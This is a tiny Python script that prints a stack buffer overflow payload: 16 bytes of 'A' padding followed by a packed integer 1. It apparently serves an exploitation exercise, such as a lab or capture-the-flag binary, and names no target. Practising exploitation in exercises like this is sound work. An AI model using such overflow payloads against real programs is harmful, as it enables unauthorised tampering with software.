import struct

out = 'A'*0x10
out += struct.pack('I', 0x1)

print(out)
